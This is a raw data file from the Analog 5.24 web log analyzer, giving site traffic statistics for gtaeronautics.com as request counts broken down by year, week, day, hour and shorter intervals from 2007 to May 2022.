x	VE	analog 5.24
x	HN	gtaeronautics.com
x	PS	2022	05	08	05	44
x	FR	2007	12	18	17	05
x	LR	2022	05	06	23	56
x	E7	2022	05	08	05	44
x	SR	1038749
x	S7	1385
x	NC	410094
x	C7	0
x	FL	421598
x	F7	347
x	RR	187
x	R7	0
x	NH	92124
x	H7	284
x	BT	42782494721
x	B7	154076101
1	Rr	28085	2.704	2022
1	Rr	98917	9.523	2021
1	Rr	89380	8.605	2020
1	Rr	80088	7.710	2019
1	Rr	68927	6.636	2018
1	Rr	60168	5.792	2017
1	Rr	73316	7.058	2016
1	Rr	80796	7.778	2015
1	Rr	110773	10.664	2014
1	Rr	65173	6.274	2013
1	Rr	60742	5.848	2012
1	Rr	57015	5.489	2011
1	Rr	22139	2.131	2010
1	Rr	69710	6.711	2009
1	Rr	71820	6.914	2008
1	Rr	1700	0.164	2007
1	*BT	R	110773	2014
W	Rr	1334	0.128	2013	11	10
W	Rr	1277	0.123	2013	11	03
W	Rr	1035	0.100	2013	10	27
W	Rr	1309	0.126	2013	10	20
W	Rr	1302	0.125	2013	10	13
W	Rr	1432	0.138	2013	10	06
W	Rr	1178	0.113	2013	09	29
W	Rr	947	0.091	2013	09	22
W	Rr	1254	0.121	2013	09	15
W	Rr	1099	0.106	2013	09	08
W	Rr	1053	0.101	2013	09	01
W	Rr	1010	0.097	2013	08	25
W	Rr	1102	0.106	2013	08	18
W	Rr	1063	0.102	2013	08	11
W	Rr	1105	0.106	2013	08	04
W	Rr	1377	0.133	2013	07	28
W	Rr	1498	0.144	2013	07	21
W	Rr	1295	0.125	2013	07	14
W	Rr	1237	0.119	2013	07	07
W	Rr	1003	0.097	2013	06	30
W	Rr	1275	0.123	2013	06	23
W	Rr	1072	0.103	2013	06	16
W	Rr	1249	0.120	2013	06	09
W	Rr	1521	0.146	2013	06	02
W	Rr	1256	0.121	2013	05	26
W	Rr	1091	0.105	2013	05	19
W	Rr	1359	0.131	2013	05	12
W	Rr	1130	0.109	2013	05	05
W	Rr	1215	0.117	2013	04	28
W	Rr	1368	0.132	2013	04	21
W	Rr	1318	0.127	2013	04	14
W	Rr	1408	0.136	2013	04	07
W	Rr	1277	0.123	2013	03	31
W	Rr	1452	0.140	2013	03	24
W	Rr	1418	0.137	2013	03	17
W	Rr	1217	0.117	2013	03	10
W	Rr	1490	0.143	2013	03	03
W	Rr	1353	0.130	2013	02	24
W	Rr	1268	0.122	2013	02	17
W	Rr	1274	0.123	2013	02	10
W	Rr	1153	0.111	2013	02	03
W	Rr	1266	0.122	2013	01	27
W	Rr	1271	0.122	2013	01	20
W	Rr	1449	0.139	2013	01	13
W	Rr	1253	0.121	2013	01	06
W	Rr	1309	0.126	2012	12	30
W	Rr	1156	0.111	2012	12	23
W	Rr	1336	0.129	2012	12	16
W	Rr	1575	0.152	2012	12	09
W	Rr	1087	0.105	2012	12	02
W	Rr	1376	0.132	2012	11	25
W	Rr	1136	0.109	2012	11	18
W	Rr	1341	0.129	2012	11	11
W	Rr	1418	0.137	2012	11	04
W	Rr	1103	0.106	2012	10	28
W	Rr	1200	0.116	2012	10	21
W	Rr	1382	0.133	2012	10	14
W	Rr	1127	0.108	2012	10	07
W	Rr	1187	0.114	2012	09	30
W	Rr	1172	0.113	2012	09	23
W	Rr	1034	0.100	2012	09	16
W	Rr	944	0.091	2012	09	09
W	Rr	958	0.092	2012	09	02
W	Rr	734	0.071	2012	08	26
W	Rr	881	0.085	2012	08	19
W	Rr	874	0.084	2012	08	12
W	Rr	973	0.094	2012	08	05
W	Rr	1010	0.097	2012	07	29
W	Rr	943	0.091	2012	07	22
W	Rr	1089	0.105	2012	07	15
W	Rr	888	0.085	2012	07	08
W	Rr	845	0.081	2012	07	01
W	Rr	1070	0.103	2012	06	24
W	Rr	1050	0.101	2012	06	17
W	Rr	1271	0.122	2012	06	10
W	Rr	957	0.092	2012	06	03
W	Rr	1249	0.120	2012	05	27
W	Rr	1055	0.102	2012	05	20
W	Rr	1392	0.134	2012	05	13
W	Rr	1140	0.110	2012	05	06
W	Rr	1807	0.174	2012	04	29
W	Rr	1225	0.118	2012	04	22
W	Rr	1264	0.122	2012	04	15
W	Rr	1075	0.103	2012	04	08
W	Rr	1261	0.121	2012	04	01
W	Rr	1345	0.129	2012	03	25
W	Rr	1254	0.121	2012	03	18
W	Rr	1478	0.142	2012	03	11
W	Rr	1503	0.145	2012	03	04
W	Rr	1532	0.147	2012	02	26
W	Rr	1464	0.141	2012	02	19
W	Rr	1154	0.111	2012	02	12
W	Rr	1240	0.119	2012	02	05
W	Rr	1088	0.105	2012	01	29
W	Rr	1125	0.108	2012	01	22
W	Rr	60	0.006	2012	01	15
W	Rr	1472	0.142	2012	01	08
W	Rr	1122	0.108	2012	01	01
W	Rr	888	0.085	2011	12	25
W	Rr	1360	0.131	2011	12	18
W	Rr	1486	0.143	2011	12	11
W	Rr	1330	0.128	2011	12	04
W	Rr	1094	0.105	2011	11	27
W	Rr	1062	0.102	2011	11	20
W	Rr	1123	0.108	2011	11	13
W	Rr	975	0.094	2011	11	06
W	Rr	1264	0.122	2011	10	30
W	Rr	1140	0.110	2011	10	23
W	Rr	1211	0.117	2011	10	16
W	Rr	1236	0.119	2011	10	09
W	Rr	1128	0.109	2011	10	02
W	Rr	1083	0.104	2011	09	25
W	Rr	1451	0.140	2011	09	18
W	Rr	1278	0.123	2011	09	11
W	Rr	1219	0.117	2011	09	04
W	Rr	1316	0.127	2011	08	28
W	Rr	1119	0.108	2011	08	21
W	Rr	1484	0.143	2011	08	14
W	Rr	1671	0.161	2011	08	07
W	Rr	1319	0.127	2011	07	31
W	Rr	1197	0.115	2011	07	24
W	Rr	1504	0.145	2011	07	17
W	Rr	1367	0.132	2011	07	10
W	Rr	1205	0.116	2011	07	03
W	Rr	1333	0.128	2011	06	26
W	Rr	1059	0.102	2011	06	19
W	Rr	1353	0.130	2011	06	12
W	Rr	1275	0.123	2011	06	05
W	Rr	983	0.095	2011	05	29
W	Rr	1262	0.121	2011	05	22
W	Rr	1374	0.132	2011	05	15
W	Rr	1076	0.104	2011	05	08
W	Rr	0	0.000	2011	05	01
W	Rr	0	0.000	2011	04	24
W	Rr	0	0.000	2011	04	17
W	Rr	0	0.000	2011	04	10
W	Rr	0	0.000	2011	04	03
W	Rr	0	0.000	2011	03	27
W	Rr	24	0.002	2011	03	20
W	Rr	1317	0.127	2011	03	13
W	Rr	1258	0.121	2011	03	06
W	Rr	1372	0.132	2011	02	27
W	Rr	1226	0.118	2011	02	20
W	Rr	1524	0.147	2011	02	13
W	Rr	1366	0.132	2011	02	06
W	Rr	958	0.092	2011	01	30
W	Rr	1273	0.123	2011	01	23
W	Rr	1560	0.150	2011	01	16
W	Rr	1472	0.142	2011	01	09
W	Rr	1310	0.126	2011	01	02
W	Rr	798	0.077	2010	12	26
W	Rr	935	0.090	2010	12	19
W	Rr	0	0.000	2010	12	12
W	Rr	0	0.000	2010	12	05
W	Rr	0	0.000	2010	11	28
W	Rr	0	0.000	2010	11	21
W	Rr	0	0.000	2010	11	14
W	Rr	0	0.000	2010	11	07
W	Rr	0	0.000	2010	10	31
W	Rr	0	0.000	2010	10	24
W	Rr	0	0.000	2010	10	17
W	Rr	0	0.000	2010	10	10
W	Rr	0	0.000	2010	10	03
W	Rr	0	0.000	2010	09	26
W	Rr	0	0.000	2010	09	19
W	Rr	0	0.000	2010	09	12
W	Rr	0	0.000	2010	09	05
W	Rr	0	0.000	2010	08	29
W	Rr	0	0.000	2010	08	22
W	Rr	0	0.000	2010	08	15
W	Rr	0	0.000	2010	08	08
W	Rr	0	0.000	2010	08	01
W	Rr	0	0.000	2010	07	25
W	Rr	0	0.000	2010	07	18
W	Rr	0	0.000	2010	07	11
W	Rr	0	0.000	2010	07	04
W	Rr	15	0.001	2010	06	27
W	Rr	914	0.088	2010	06	20
W	Rr	1104	0.106	2010	06	13
W	Rr	1096	0.106	2010	06	06
W	Rr	1171	0.113	2010	05	30
W	Rr	1115	0.107	2010	05	23
W	Rr	1170	0.113	2010	05	16
W	Rr	1334	0.128	2010	05	09
W	Rr	1109	0.107	2010	05	02
W	Rr	1067	0.103	2010	04	25
W	Rr	1212	0.117	2010	04	18
W	Rr	1054	0.101	2010	04	11
W	Rr	1325	0.128	2010	04	04
W	Rr	811	0.078	2010	03	28
W	Rr	1195	0.115	2010	03	21
W	Rr	1338	0.129	2010	03	14
W	Rr	1113	0.107	2010	03	07
W	Rr	1103	0.106	2010	02	28
W	Rr	1290	0.124	2010	02	21
W	Rr	0	0.000	2010	02	14
W	Rr	0	0.000	2010	02	07
W	Rr	0	0.000	2010	01	31
W	Rr	0	0.000	2010	01	24
W	Rr	0	0.000	2010	01	17
W	Rr	0	0.000	2010	01	10
W	Rr	0	0.000	2010	01	03
W	Rr	78	0.008	2009	12	27
W	Rr	945	0.091	2009	12	20
W	Rr	1140	0.110	2009	12	13
W	Rr	1323	0.127	2009	12	06
W	Rr	1518	0.146	2009	11	29
W	Rr	1352	0.130	2009	11	22
W	Rr	1346	0.130	2009	11	15
W	Rr	1416	0.136	2009	11	08
W	Rr	1734	0.167	2009	11	01
W	Rr	1035	0.100	2009	10	25
W	Rr	1297	0.125	2009	10	18
W	Rr	1267	0.122	2009	10	11
W	Rr	1440	0.139	2009	10	04
W	Rr	1521	0.146	2009	09	27
W	Rr	1121	0.108	2009	09	20
W	Rr	875	0.084	2009	09	13
W	Rr	1032	0.099	2009	09	06
W	Rr	1283	0.124	2009	08	30
W	Rr	1214	0.117	2009	08	23
W	Rr	1402	0.135	2009	08	16
W	Rr	1260	0.121	2009	08	09
W	Rr	1404	0.135	2009	08	02
W	Rr	1380	0.133	2009	07	26
W	Rr	1470	0.142	2009	07	19
W	Rr	1750	0.168	2009	07	12
W	Rr	1847	0.178	2009	07	05
W	Rr	1889	0.182	2009	06	28
W	Rr	1312	0.126	2009	06	21
W	Rr	1093	0.105	2009	06	14
W	Rr	1363	0.131	2009	06	07
W	Rr	1251	0.120	2009	05	31
W	Rr	1352	0.130	2009	05	24
W	Rr	1133	0.109	2009	05	17
W	Rr	1887	0.182	2009	05	10
W	Rr	1369	0.132	2009	05	03
W	Rr	1089	0.105	2009	04	26
W	Rr	1160	0.112	2009	04	19
W	Rr	1189	0.114	2009	04	12
W	Rr	1529	0.147	2009	04	05
W	Rr	1155	0.111	2009	03	29
W	Rr	1230	0.118	2009	03	22
W	Rr	1029	0.099	2009	03	15
W	Rr	1234	0.119	2009	03	08
W	Rr	1486	0.143	2009	03	01
W	Rr	1470	0.142	2009	02	22
W	Rr	1198	0.115	2009	02	15
W	Rr	1802	0.173	2009	02	08
W	Rr	1653	0.159	2009	02	01
W	Rr	1346	0.130	2009	01	25
W	Rr	1431	0.138	2009	01	18
W	Rr	1678	0.162	2009	01	11
W	Rr	1591	0.153	2009	01	04
W	Rr	886	0.085	2008	12	28
W	Rr	1148	0.111	2008	12	21
W	Rr	1428	0.137	2008	12	14
W	Rr	1508	0.145	2008	12	07
W	Rr	1194	0.115	2008	11	30
W	Rr	1070	0.103	2008	11	23
W	Rr	1396	0.134	2008	11	16
W	Rr	1255	0.121	2008	11	09
W	Rr	1314	0.126	2008	11	02
W	Rr	1397	0.134	2008	10	26
W	Rr	1638	0.158	2008	10	19
W	Rr	1298	0.125	2008	10	12
W	Rr	430	0.041	2008	10	05
W	Rr	723	0.070	2008	09	28
W	Rr	1308	0.126	2008	09	21
W	Rr	1242	0.120	2008	09	14
W	Rr	1409	0.136	2008	09	07
W	Rr	1142	0.110	2008	08	31
W	Rr	1022	0.098	2008	08	24
W	Rr	1062	0.102	2008	08	17
W	Rr	1188	0.114	2008	08	10
W	Rr	1232	0.119	2008	08	03
W	Rr	1050	0.101	2008	07	27
W	Rr	1272	0.122	2008	07	20
W	Rr	1305	0.126	2008	07	13
W	Rr	1093	0.105	2008	07	06
W	Rr	1182	0.114	2008	06	29
W	Rr	1937	0.186	2008	06	22
W	Rr	1493	0.144	2008	06	15
W	Rr	1083	0.104	2008	06	08
W	Rr	1283	0.124	2008	06	01
W	Rr	1432	0.138	2008	05	25
W	Rr	1726	0.166	2008	05	18
W	Rr	1580	0.152	2008	05	11
W	Rr	2661	0.256	2008	05	04
W	Rr	3648	0.351	2008	04	27
W	Rr	1400	0.135	2008	04	20
W	Rr	1365	0.131	2008	04	13
W	Rr	1213	0.117	2008	04	06
W	Rr	1670	0.161	2008	03	30
W	Rr	1211	0.117	2008	03	23
W	Rr	1144	0.110	2008	03	16
W	Rr	1301	0.125	2008	03	09
W	Rr	1292	0.124	2008	03	02
W	Rr	1427	0.137	2008	02	24
W	Rr	2207	0.212	2008	02	17
W	Rr	1124	0.108	2008	02	10
W	Rr	1561	0.150	2008	02	03
W	Rr	1533	0.148	2008	01	27
W	Rr	1389	0.134	2008	01	20
W	Rr	1133	0.109	2008	01	13
W	Rr	1404	0.135	2008	01	06
W	Rr	976	0.094	2007	12	30
W	Rr	801	0.077	2007	12	23
W	Rr	675	0.065	2007	12	16
W	*BT	R	7060	2014	02	16
D	Rr	248	0.024	2022	05	06
D	Rr	169	0.016	2022	05	05
D	Rr	362	0.035	2022	05	04
D	Rr	282	0.027	2022	05	03
D	Rr	187	0.018	2022	05	02
D	Rr	166	0.016	2022	05	01
D	Rr	0	0.000	2022	04	30
D	Rr	235	0.023	2022	04	29
D	Rr	420	0.040	2022	04	28
D	Rr	498	0.048	2022	04	27
D	Rr	194	0.019	2022	04	26
D	Rr	360	0.035	2022	04	25
D	Rr	158	0.015	2022	04	24
D	Rr	0	0.000	2022	04	23
D	Rr	250	0.024	2022	04	22
D	Rr	188	0.018	2022	04	21
D	Rr	228	0.022	2022	04	20
D	Rr	328	0.032	2022	04	19
D	Rr	161	0.015	2022	04	18
D	Rr	226	0.022	2022	04	17
D	Rr	0	0.000	2022	04	16
D	Rr	167	0.016	2022	04	15
D	Rr	204	0.020	2022	04	14
D	Rr	292	0.028	2022	04	13
D	Rr	504	0.049	2022	04	12
D	Rr	296	0.028	2022	04	11
D	Rr	167	0.016	2022	04	10
D	Rr	0	0.000	2022	04	09
D	Rr	282	0.027	2022	04	08
D	Rr	159	0.015	2022	04	07
D	Rr	338	0.033	2022	04	06
D	Rr	548	0.053	2022	04	05
D	Rr	223	0.021	2022	04	04
D	Rr	120	0.012	2022	04	03
D	Rr	0	0.000	2022	04	02
D	Rr	255	0.025	2022	04	01
D	Rr	281	0.027	2022	03	31
D	Rr	218	0.021	2022	03	30
D	Rr	217	0.021	2022	03	29
D	Rr	283	0.027	2022	03	28
D	Rr	334	0.032	2022	03	27
D	Rr	0	0.000	2022	03	26
D	*BT	R	2131	2008	05	03
d	Rr	125029	12.036	Sun
d	Rr	167480	16.123	Mon
d	Rr	170623	16.426	Tue
d	Rr	169036	16.273	Wed
d	Rr	169131	16.282	Thu
d	Rr	160426	15.444	Fri
d	Rr	77024	7.415	Sat
H	Rr	3	0.000	2022	05	06	23
H	Rr	5	0.000	2022	05	06	22
H	Rr	4	0.000	2022	05	06	21
H	Rr	5	0.000	2022	05	06	20
H	Rr	9	0.001	2022	05	06	19
H	Rr	8	0.001	2022	05	06	18
H	Rr	35	0.003	2022	05	06	17
H	Rr	6	0.001	2022	05	06	16
H	Rr	2	0.000	2022	05	06	15
H	Rr	4	0.000	2022	05	06	14
H	Rr	6	0.001	2022	05	06	13
H	Rr	8	0.001	2022	05	06	12
H	Rr	27	0.003	2022	05	06	11
H	Rr	1	0.000	2022	05	06	10
H	Rr	12	0.001	2022	05	06	09
H	Rr	5	0.000	2022	05	06	08
H	Rr	2	0.000	2022	05	06	07
H	Rr	2	0.000	2022	05	06	06
H	Rr	25	0.002	2022	05	06	05
H	Rr	27	0.003	2022	05	06	04
H	Rr	5	0.000	2022	05	06	03
H	Rr	8	0.001	2022	05	06	02
H	Rr	5	0.000	2022	05	06	01
H	Rr	34	0.003	2022	05	06	00
H	Rr	1	0.000	2022	05	05	23
H	Rr	2	0.000	2022	05	05	22
H	Rr	3	0.000	2022	05	05	21
H	Rr	0	0.000	2022	05	05	20
H	Rr	18	0.002	2022	05	05	19
H	Rr	15	0.001	2022	05	05	18
H	Rr	7	0.001	2022	05	05	17
H	Rr	2	0.000	2022	05	05	16
H	Rr	22	0.002	2022	05	05	15
H	Rr	41	0.004	2022	05	05	14
H	Rr	0	0.000	2022	05	05	13
H	Rr	14	0.001	2022	05	05	12
H	Rr	6	0.001	2022	05	05	11
H	Rr	3	0.000	2022	05	05	10
H	Rr	2	0.000	2022	05	05	09
H	Rr	7	0.001	2022	05	05	08
H	Rr	1	0.000	2022	05	05	07
H	Rr	1	0.000	2022	05	05	06
H	Rr	2	0.000	2022	05	05	05
H	Rr	2	0.000	2022	05	05	04
H	Rr	3	0.000	2022	05	05	03
H	Rr	8	0.001	2022	05	05	02
H	Rr	7	0.001	2022	05	05	01
H	Rr	2	0.000	2022	05	05	00
H	Rr	2	0.000	2022	05	04	23
H	Rr	1	0.000	2022	05	04	22
H	Rr	3	0.000	2022	05	04	21
H	Rr	6	0.001	2022	05	04	20
H	Rr	2	0.000	2022	05	04	19
H	Rr	2	0.000	2022	05	04	18
H	Rr	8	0.001	2022	05	04	17
H	Rr	8	0.001	2022	05	04	16
H	Rr	2	0.000	2022	05	04	15
H	Rr	10	0.001	2022	05	04	14
H	Rr	108	0.010	2022	05	04	13
H	Rr	3	0.000	2022	05	04	12
H	Rr	8	0.001	2022	05	04	11
H	Rr	5	0.000	2022	05	04	10
H	Rr	4	0.000	2022	05	04	09
H	Rr	9	0.001	2022	05	04	08
H	Rr	24	0.002	2022	05	04	07
H	Rr	6	0.001	2022	05	04	06
H	Rr	5	0.000	2022	05	04	05
H	Rr	31	0.003	2022	05	04	04
H	Rr	14	0.001	2022	05	04	03
H	Rr	6	0.001	2022	05	04	02
H	Rr	69	0.007	2022	05	04	01
H	Rr	26	0.003	2022	05	04	00
H	*BT	R	750	2020	12	11	23
h	Rr	40638	3.912	00
h	Rr	39652	3.817	01
h	Rr	40483	3.897	02
h	Rr	40146	3.865	03
h	Rr	38884	3.743	04
h	Rr	36978	3.560	05
h	Rr	36275	3.492	06
h	Rr	35523	3.420	07
h	Rr	34331	3.305	08
h	Rr	32941	3.171	09
h	Rr	33134	3.190	10
h	Rr	36752	3.538	11
h	Rr	36740	3.537	12
h	Rr	38719	3.727	13
h	Rr	45359	4.367	14
h	Rr	51156	4.925	15
h	Rr	55153	5.310	16
h	Rr	55546	5.347	17
h	Rr	56369	5.427	18
h	Rr	55594	5.352	19
h	Rr	54777	5.273	20
h	Rr	51648	4.972	21
h	Rr	47193	4.543	22
h	Rr	44758	4.309	23
4	Rr	1	0.000	2022	05	06	23	45
4	Rr	0	0.000	2022	05	06	23	30
4	Rr	2	0.000	2022	05	06	23	15
4	Rr	0	0.000	2022	05	06	23	00
4	Rr	3	0.000	2022	05	06	22	45
4	Rr	0	0.000	2022	05	06	22	30
4	Rr	1	0.000	2022	05	06	22	15
4	Rr	1	0.000	2022	05	06	22	00
4	Rr	2	0.000	2022	05	06	21	45
4	Rr	0	0.000	2022	05	06	21	30
4	Rr	0	0.000	2022	05	06	21	15
4	Rr	2	0.000	2022	05	06	21	00
4	Rr	3	0.000	2022	05	06	20	45
4	Rr	0	0.000	2022	05	06	20	30
4	Rr	1	0.000	2022	05	06	20	15
4	Rr	1	0.000	2022	05	06	20	00
4	Rr	4	0.000	2022	05	06	19	45
4	Rr	0	0.000	2022	05	06	19	30
4	Rr	2	0.000	2022	05	06	19	15
4	Rr	3	0.000	2022	05	06	19	00
4	Rr	3	0.000	2022	05	06	18	45
4	Rr	2	0.000	2022	05	06	18	30
4	Rr	1	0.000	2022	05	06	18	15
4	Rr	2	0.000	2022	05	06	18	00
4	Rr	3	0.000	2022	05	06	17	45
4	Rr	2	0.000	2022	05	06	17	30
4	Rr	0	0.000	2022	05	06	17	15
4	Rr	30	0.003	2022	05	06	17	00
4	Rr	0	0.000	2022	05	06	16	45
4	Rr	4	0.000	2022	05	06	16	30
4	Rr	1	0.000	2022	05	06	16	15
4	Rr	1	0.000	2022	05	06	16	00
4	Rr	1	0.000	2022	05	06	15	45
4	Rr	1	0.000	2022	05	06	15	30
4	Rr	0	0.000	2022	05	06	15	15
4	Rr	0	0.000	2022	05	06	15	00
4	Rr	1	0.000	2022	05	06	14	45
4	Rr	1	0.000	2022	05	06	14	30
4	Rr	1	0.000	2022	05	06	14	15
4	Rr	1	0.000	2022	05	06	14	00
4	Rr	0	0.000	2022	05	06	13	45
4	Rr	2	0.000	2022	05	06	13	30
4	Rr	0	0.000	2022	05	06	13	15
4	Rr	4	0.000	2022	05	06	13	00
4	Rr	2	0.000	2022	05	06	12	45
4	Rr	5	0.000	2022	05	06	12	30
4	Rr	1	0.000	2022	05	06	12	15
4	Rr	0	0.000	2022	05	06	12	00
4	Rr	3	0.000	2022	05	06	11	45
4	Rr	23	0.002	2022	05	06	11	30
4	Rr	0	0.000	2022	05	06	11	15
4	Rr	1	0.000	2022	05	06	11	00
4	Rr	1	0.000	2022	05	06	10	45
4	Rr	0	0.000	2022	05	06	10	30
4	Rr	0	0.000	2022	05	06	10	15
4	Rr	0	0.000	2022	05	06	10	00
4	Rr	1	0.000	2022	05	06	09	45
4	Rr	3	0.000	2022	05	06	09	30
4	Rr	5	0.000	2022	05	06	09	15
4	Rr	3	0.000	2022	05	06	09	00
4	Rr	1	0.000	2022	05	06	08	45
4	Rr	2	0.000	2022	05	06	08	30
4	Rr	0	0.000	2022	05	06	08	15
4	Rr	2	0.000	2022	05	06	08	00
4	Rr	0	0.000	2022	05	06	07	45
4	Rr	0	0.000	2022	05	06	07	30
4	Rr	1	0.000	2022	05	06	07	15
4	Rr	1	0.000	2022	05	06	07	00
4	Rr	0	0.000	2022	05	06	06	45
4	Rr	1	0.000	2022	05	06	06	30
4	Rr	0	0.000	2022	05	06	06	15
4	Rr	1	0.000	2022	05	06	06	00
4	Rr	3	0.000	2022	05	06	05	45
4	Rr	0	0.000	2022	05	06	05	30
4	Rr	20	0.002	2022	05	06	05	15
4	Rr	2	0.000	2022	05	06	05	00
4	Rr	2	0.000	2022	05	06	04	45
4	Rr	1	0.000	2022	05	06	04	30
4	Rr	21	0.002	2022	05	06	04	15
4	Rr	3	0.000	2022	05	06	04	00
4	Rr	1	0.000	2022	05	06	03	45
4	Rr	2	0.000	2022	05	06	03	30
4	Rr	0	0.000	2022	05	06	03	15
4	Rr	2	0.000	2022	05	06	03	00
4	Rr	2	0.000	2022	05	06	02	45
4	Rr	3	0.000	2022	05	06	02	30
4	Rr	1	0.000	2022	05	06	02	15
4	Rr	2	0.000	2022	05	06	02	00
4	Rr	1	0.000	2022	05	06	01	45
4	Rr	3	0.000	2022	05	06	01	30
4	Rr	0	0.000	2022	05	06	01	15
4	Rr	1	0.000	2022	05	06	01	00
4	Rr	0	0.000	2022	05	06	00	45
4	Rr	29	0.003	2022	05	06	00	30
4	Rr	0	0.000	2022	05	06	00	15
4	Rr	5	0.000	2022	05	06	00	00
4	*BT	R	744	2021	04	12	15	00
6	Rr	10016	0.964	00	00
6	Rr	10104	0.973	00	15
6	Rr	10104	0.973	00	30
6	Rr	10414	1.003	00	45
6	Rr	9777	0.941	01	00
6	Rr	9962	0.959	01	15
6	Rr	10069	0.969	01	30
6	Rr	9844	0.948	01	45
6	Rr	9601	0.924	02	00
6	Rr	10606	1.021	02	15
6	Rr	10330	0.994	02	30
6	Rr	9946	0.957	02	45
6	Rr	9553	0.920	03	00
6	Rr	9486	0.913	03	15
6	Rr	9806	0.944	03	30
6	Rr	11301	1.088	03	45
6	Rr	9747	0.938	04	00
6	Rr	10279	0.990	04	15
6	Rr	9222	0.888	04	30
6	Rr	9636	0.928	04	45
6	Rr	8921	0.859	05	00
6	Rr	9810	0.944	05	15
6	Rr	9454	0.910	05	30
6	Rr	8793	0.846	05	45
6	Rr	9845	0.948	06	00
6	Rr	8935	0.860	06	15
6	Rr	9047	0.871	06	30
6	Rr	8448	0.813	06	45
6	Rr	8863	0.853	07	00
6	Rr	9222	0.888	07	15
6	Rr	9216	0.887	07	30
6	Rr	8222	0.792	07	45
6	Rr	8880	0.855	08	00
6	Rr	8456	0.814	08	15
6	Rr	9000	0.866	08	30
6	Rr	7995	0.770	08	45
6	Rr	8369	0.806	09	00
6	Rr	8402	0.809	09	15
6	Rr	8168	0.786	09	30
6	Rr	8002	0.770	09	45
6	Rr	7890	0.760	10	00
6	Rr	7946	0.765	10	15
6	Rr	8096	0.779	10	30
6	Rr	9202	0.886	10	45
6	Rr	10200	0.982	11	00
6	Rr	8648	0.833	11	15
6	Rr	8941	0.861	11	30
6	Rr	8963	0.863	11	45
6	Rr	10096	0.972	12	00
6	Rr	8751	0.842	12	15
6	Rr	8852	0.852	12	30
6	Rr	9041	0.870	12	45
6	Rr	9546	0.919	13	00
6	Rr	9433	0.908	13	15
6	Rr	10112	0.973	13	30
6	Rr	9628	0.927	13	45
6	Rr	10956	1.055	14	00
6	Rr	11512	1.108	14	15
6	Rr	11423	1.100	14	30
6	Rr	11468	1.104	14	45
6	Rr	12584	1.211	15	00
6	Rr	12081	1.163	15	15
6	Rr	13015	1.253	15	30
6	Rr	13476	1.297	15	45
6	Rr	13606	1.310	16	00
6	Rr	13542	1.304	16	15
6	Rr	13991	1.347	16	30
6	Rr	14014	1.349	16	45
6	Rr	14110	1.358	17	00
6	Rr	13643	1.313	17	15
6	Rr	14089	1.356	17	30
6	Rr	13704	1.319	17	45
6	Rr	13693	1.318	18	00
6	Rr	14183	1.365	18	15
6	Rr	14140	1.361	18	30
6	Rr	14353	1.382	18	45
6	Rr	14913	1.436	19	00
6	Rr	13348	1.285	19	15
6	Rr	13664	1.315	19	30
6	Rr	13669	1.316	19	45
6	Rr	14182	1.365	20	00
6	Rr	13697	1.319	20	15
6	Rr	13017	1.253	20	30
6	Rr	13881	1.336	20	45
6	Rr	13853	1.334	21	00
6	Rr	12730	1.226	21	15
6	Rr	12373	1.191	21	30
6	Rr	12692	1.222	21	45
6	Rr	11927	1.148	22	00
6	Rr	12000	1.155	22	15
6	Rr	11821	1.138	22	30
6	Rr	11445	1.102	22	45
6	Rr	11856	1.141	23	00
6	Rr	11996	1.155	23	15
6	Rr	10722	1.032	23	30
6	Rr	10184	0.980	23	45
5	Rr	1	0.000	2022	05	06	23	55
5	Rr	0	0.000	2022	05	06	23	50
5	Rr	0	0.000	2022	05	06	23	45
5	Rr	0	0.000	2022	05	06	23	40
5	Rr	0	0.000	2022	05	06	23	35
5	Rr	0	0.000	2022	05	06	23	30
5	Rr	0	0.000	2022	05	06	23	25
5	Rr	0	0.000	2022	05	06	23	20
5	Rr	2	0.000	2022	05	06	23	15
5	Rr	0	0.000	2022	05	06	23	10
5	Rr	0	0.000	2022	05	06	23	05
5	Rr	0	0.000	2022	05	06	23	00
5	Rr	1	0.000	2022	05	06	22	55
5	Rr	2	0.000	2022	05	06	22	50
5	Rr	0	0.000	2022	05	06	22	45
5	Rr	0	0.000	2022	05	06	22	40
5	Rr	0	0.000	2022	05	06	22	35
5	Rr	0	0.000	2022	05	06	22	30
5	Rr	1	0.000	2022	05	06	22	25
5	Rr	0	0.000	2022	05	06	22	20
5	Rr	0	0.000	2022	05	06	22	15
5	Rr	1	0.000	2022	05	06	22	10
5	Rr	0	0.000	2022	05	06	22	05
5	Rr	0	0.000	2022	05	06	22	00
5	Rr	1	0.000	2022	05	06	21	55
5	Rr	1	0.000	2022	05	06	21	50
5	Rr	0	0.000	2022	05	06	21	45
5	Rr	0	0.000	2022	05	06	21	40
5	Rr	0	0.000	2022	05	06	21	35
5	Rr	0	0.000	2022	05	06	21	30
5	Rr	0	0.000	2022	05	06	21	25
